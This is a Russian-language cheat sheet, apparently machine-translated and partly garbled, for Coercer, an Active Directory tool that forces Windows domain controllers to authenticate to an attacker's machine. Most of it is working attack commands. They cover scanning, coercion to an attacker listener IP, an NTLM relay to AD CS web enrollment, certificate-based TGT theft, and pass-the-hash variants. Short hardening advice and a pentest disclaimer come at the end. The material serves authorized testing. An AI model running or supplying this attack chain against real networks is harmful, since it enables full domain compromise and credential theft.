<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 Принудитель — полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Лицензия GPLv3">
</p>

<p выравнивание="центр">
  <b>🌐 Автоматически сканировать, обнаруживать и принуждать серверы Windows и контроллеры домена проходить аутентификацию на произвольных компьютерах с помощью более чем 12 протоколов RPC</b>
</p>

---

## 📋 Содержание

- [Обзор и примитив принуждения аутентификации](#-overview--the-authentication-coercion-primitive)
- [Поддерживаемые протоколы и методы RPC](#-supported-rpc-protocols--methods)
- [Установка](#-установка)
- [Сканирование уязвимых интерфейсов RPC (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Выполнение принуждения аутентификации (`coerce`)](#-executing-authentication-coercion-coerce)
- [Полная цепочка атак: приведение -> NTLM Relay -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [Фильтрация протоколов и методов] (#-протокол -- фильтрация методов)
- [Поддержка Kerberos и Pass-the-Hash](#-kerberos--pass-the-hash-support)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и усиление](#-защитные-соображения--укрепление)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и примитив принуждения аутентификации

В средах Active Directory **принуждение аутентификации** является разрушительным оскорбительным примитивом. Он использует устаревшие интерфейсы RPC, реализованные в службах Windows, которые позволяют аутентифицированному пользователю запросить удаленный компьютер (например, контроллер домена) подключиться к назначенному пути UNC (`\\attacker\share`).

Когда удаленный компьютер Windows подключается к компьютеру, контролируемому злоумышленником, он инициирует **аутентификацию NTLM-учетной записи** (`DC01$`). 

Перехватив или передав учетные данные этого компьютера с помощью `ntlmrelayx` в службы сертификации Active Directory (веб-регистрация AD CS — ESC8) или цели неограниченного делегирования, злоумышленники могут добиться **немедленной полной компрометации домена**.

Созданный **Клементом Нотином (p0dalirius)**, **Coercer** объединяет более дюжины отдельных эксплойтов принуждения (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) в единую автоматизированную высокомодульную структуру.

---

## 🔌 Поддерживаемые протоколы и методы RPC

Coercer тестирует и использует следующие интерфейсы RPC:

| Имя протокола | Общее имя эксплойта | Труба/Интерфейс |
|---------------|---------------------|------------------|
| **МС-EFSRPC** | ПетитПотам | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **МС-РПРН** | PrinterBug/SpoolSample | `\pipe\spoolss` |
| **МС-ФСРВП** | Теневое принуждение | `\pipe\FSRVP` |
| **МС-ДФСНМ** | DFSCoerce | `\pipe\netdfs` |
| **МС-ПАН** | РаспечататьКошмар рядом | Удаленное администрирование печати |
| **МС-САМР** | Сыр | Менеджер учетных записей безопасности |

---

## 📥 Установка
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 Сканирование уязвимых интерфейсов RPC (`scan`)

Прежде чем запускать принудительное принуждение, безопасно просканируйте целевые контроллеры домена, чтобы определить, какие функции RPC включены и доступны:
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ Выполнение принудительной аутентификации (`coerce`)

Запустите исходящее NTLM-соединение учетной записи компьютера от целевого контроллера домена к прослушивателю:
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 Полная цепочка атак: принуждение -> NTLM Relay -> AD CS ESC8

Канонический вектор эскалации домена:
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 Фильтрация протоколов и методов

Нацельтесь на конкретный метод, не рассылая спам всему спектру RPC:
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Поддержка Kerberos и Pass-the-Hash
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Сканировать DC на предмет принуждения** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Принудительная аутентификация** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Принуждение через MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Принуждение через MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Принуждение к передаче хэша** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Принудительное использование билетов Kerberos** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Соображения по защите и закалке

1. **Отключите диспетчер очереди печати на контроллерах домена.** Службу диспетчера очереди печати (`spoolsv.exe`) следует полностью отключить на контроллерах домена (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **Включить расширенную защиту для проверки подлинности (EPA).** На серверах AD CS IIS включите EPA и требуйте HTTPS для блокировки атак NTLM Relay.
3. **Фильтрация RPC и сегментация сети:** Ограничьте доступ к сопоставителю конечных точек RPC (порт TCP 135) авторизованными административными подсетями.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Coercer запускает активные вызовы удаленной аутентификации, которые могут дестабилизировать необновленные доменные службы. Используйте исключительно во время авторизованных тестов на проникновение и с явного согласия клиента.